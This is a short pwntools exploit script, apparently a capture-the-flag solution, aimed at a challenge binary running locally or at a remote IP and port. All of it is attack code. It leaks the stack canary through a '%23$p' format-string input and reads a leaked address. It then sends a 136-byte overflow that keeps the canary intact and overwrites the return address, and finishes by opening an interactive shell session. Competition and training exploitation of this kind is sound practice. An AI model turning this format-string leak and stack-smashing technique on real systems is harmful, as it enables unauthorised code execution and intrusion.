from pwn import * 

def conn(): 
    if args.GDB: 
        return gdb.debug(args.BINARY, 
        gdbscript="""
        continue
        """)  # Add necessary gdb commands here
    elif args.REMOTE: 
        return remote('52.184.85.16', 12345)
    else: 
        return process(args.BINARY)

def solve(): 
    p = conn()
    p.sendline("13523148")
    p.sendline("6")

    p.recvuntil(b"Oops: ")
    oops = int(p.recvline(), 16)

    p.recvuntil(b"Is it fatal tho?\n")
    p.sendline(b"%23$p")
    canary = int(p.recvline(), 16)
    
    padding = b'T' * 136
    payload = padding 
    
    # write your payload here
    payload += p64(canary)
    payload += p64(canary)
    payload += p64(oops-26)

    p.sendline(payload) # meng-inject payload ke dalam binary
    p.interactive() # flush to stdout 

solve()